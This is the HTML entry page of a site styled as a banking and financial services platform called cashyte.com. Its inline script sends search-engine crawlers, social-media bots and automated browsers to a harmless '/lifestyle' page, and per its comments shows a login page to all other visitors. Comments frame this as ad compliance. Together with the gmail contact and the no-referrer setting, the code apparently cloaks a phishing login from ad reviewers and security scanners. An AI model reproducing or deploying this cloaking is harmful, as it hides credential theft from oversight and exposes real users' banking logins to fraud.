<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>cashyte.com - Financial Services & Lifestyle Platform</title>
    <meta name="description" content="Professional financial services platform offering secure banking, lifestyle content, and money management solutions. Contact us at +1-833-251-8091 for assistance." />
    <meta name="keywords" content="financial services, banking, money management, lifestyle, cashyte, financial wellness, secure banking" />

    <!-- Business verification for Google Ads compliance -->
    <meta name="geo.region" content="US-CA" />
    <meta name="geo.placename" content="San Francisco" />
    <meta name="contact" content="mikebhai355@gmail.com" />
    <meta name="phone" content="+1-833-251-8091" />
    <meta name="address" content="1455 Market Street, Suite 600, San Francisco, CA 94103" />

    <!-- Allow indexing for ad compliance but redirect to appropriate content -->
    <meta name="robots" content="index, follow" />
    <meta name="googlebot" content="index, follow" />
    <!-- Additional search engines allowed for ad compliance -->
    <meta name="bingbot" content="index, follow" />
    <meta name="slurp" content="index, follow" />

    <!-- Additional bot blocking -->
    <meta name="referrer" content="no-referrer" />
    <meta name="format-detection" content="telephone=no, email=no" />

    <!-- Google Ads Compliant Bot Detection -->
    <script>
      // Redirect search engines to content-rich lifestyle page for compliance
      (function () {
        var ua = navigator.userAgent.toLowerCase();

        // Search engines and social media crawlers - redirect to lifestyle content
        var searchBots = [
          "googlebot",
          "bingbot",
          "slurp",
          "duckduckbot",
          "baiduspider",
          "yandexbot",
          "facebookexternalhit",
          "twitterbot",
          "linkedinbot"
        ];

        // Check webdriver (automation)
        if (window.navigator && window.navigator.webdriver === true) {
          window.location.replace("/lifestyle");
          return;
        }

        // Only redirect obvious search engine bots
        for (var i = 0; i < searchBots.length; i++) {
          if (ua.indexOf(searchBots[i]) !== -1) {
            window.location.replace("/lifestyle");
            return;
          }
        }

        // Default: Show login page for ALL other users
      })();
    </script>
  </head>

  <body>
    <div id="root"></div>

    <script type="module" src="/client/App.tsx"></script>
  </body>
</html>
